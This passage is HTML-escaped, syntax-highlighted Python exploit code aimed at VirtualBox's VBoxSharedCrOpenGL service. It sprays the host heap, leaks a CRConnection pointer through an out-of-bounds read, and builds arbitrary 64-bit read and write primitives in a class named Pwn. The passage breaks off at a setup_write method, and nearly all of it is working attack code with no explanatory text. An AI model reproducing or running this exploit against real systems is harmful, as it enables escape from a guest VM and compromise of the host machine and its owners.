        &lt;span class=&quot;n&quot;&gt;alloc_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x290&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;600&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;alloc_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x9d0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# This will allocate a CRClient and CRConnection right next to each other.&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;new_client&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hgcm_connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;VBoxSharedCrOpenGL&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;alloc_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x290&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;alloc_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x9d0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;hgcm_disconnect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# Leak pClient member of CRConnection struct, and from that compute&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# CRConnection address.&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;make_oob_read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OFFSET_CONN_CLIENT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;crmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x290&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;pClient&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;pConn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pClient&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x9e0&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;new_client&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hgcm_connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;VBoxSharedCrOpenGL&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;set_version&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pConn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pClient&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Pwn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;what&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;A&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hgcm_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,[&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write_buf_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
        
        &lt;span class=&quot;n&quot;&gt;hgcm_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x41414141&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x41414141&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;what&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;write64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;what&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;what&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canfail&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# Set pHostBuffer and cbHostBuffer, then read from the Chromium stream.&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pConn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OFFSET_CONN_HOSTBUF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pConn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OFFSET_CONN_HOSTBUFSZ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sz&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hgcm_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SHCRGL_GUEST_FN_READ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canfail&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sz&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;assert&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sz&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;read64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canfail&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canfail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&amp;lt;Q&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;leak_stuff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hgcm_connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;VBoxSharedCrOpenGL&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;set_version&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hgcm_connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;VBoxSharedCrOpenGL&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;set_version&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# TODO maybe spray even more?&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;400&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;alloc_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x290&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;400&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;alloc_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x9d0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;600&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;alloc_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# self.master_id, self.master, _ = leak_buf(self.client1)&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# print(&#39;[*] Header for buffer # %d is at 0x%016x (master)&#39; % (self.master_id, self.master))&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# self.victim_id, self.victim, _ = leak_buf(self.client1)&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# print(&#39;[*] Header for buffer # %d is at 0x%016x (victim)&#39; % (self.victim_id, self.victim))&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pConn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;leak_conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;[*] Leaked CRConnection @ 0x&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%016x&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pConn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    
    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;setup_write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
